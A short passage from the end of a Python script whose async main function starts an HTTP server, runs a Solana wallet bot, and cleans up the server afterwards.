    http_runner = await start_http_server()

    try:
        # Start the bot
        bot = SolanaWalletBot()
        await bot.start_bot()
    finally:
        # Cleanup HTTP server
        if http_runner:
            await http_runner.cleanup()


if __name__ == "__main__":
    asyncio.run(main())